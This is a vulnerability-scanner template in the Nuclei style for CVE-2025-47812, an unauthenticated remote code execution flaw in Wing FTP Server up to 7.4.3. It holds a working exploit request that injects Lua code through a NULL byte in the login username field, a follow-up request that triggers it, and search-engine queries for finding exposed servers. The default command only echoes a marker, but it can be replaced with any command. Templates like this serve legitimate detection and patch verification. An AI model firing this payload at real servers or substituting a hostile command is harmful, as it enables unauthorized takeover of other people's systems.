script_name: Wing FTP Server <= 7.4.3 - Remote Code Execution
content:
id: CVE-2025-47812

info:
  name: Wing FTP Server <= 7.4.3 - Remote Code Execution
  author: vva
  severity: critical
  description: |
    There is an unauthenticated Remote Code execution (RCE) vulnerability (CVE-2025-47812) in versions of Wing FTP Server prior to 7.4.4. This vulnerability stems from improper handling of the NULL byte in the "username" parameter during the login process, resulting in Lua code being injected into the session file. These injected session files are executed when accessing authenticated terminal nodes (such as /dir.html), resulting in the execution of arbitrary commands with elevated privileges. This attack can only occur when anonymous login is enabled on the server.
  reference:
    - https://www.rcesecurity.com/2025/06/what-the-null-wing-ftp-server-rce-cve-2025-47812/
  classification:
    cve-id: CVE-2025-47812
  metadata:
    verified: true
    product: wftpserver
    vendor: wing_ftp_server
    shodan-query:
      - http.html_hash:2121146066
      - http.favicon.hash:963565804
      - title:"Wing FTP Server"
      - "Server: Wing FTP Server"
    fofa-query:
      - icon_hash="963565804"
      - title="Wing FTP Server"
      - "Server: Wing FTP Server"
    zoomeye-query:
      - app="Wing FTP Server"
  tags: cve2025,rce,wingftp

variables:
  cmd: "echo CVE-2025-47812"

http:
  - raw:
      - |
        POST /loginok.html HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=anonymous%00]]%0dlocal+h+%3d+io.popen("{{cmd}}")%0dlocal+r+%3d+h%3aread("*a")%0dh%3aclose()%0dprint(r)%0d--&password=

  - raw:
      - |
        GET /dir.html HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(to_lower(body), "cve-2025-47812")'
        condition: and
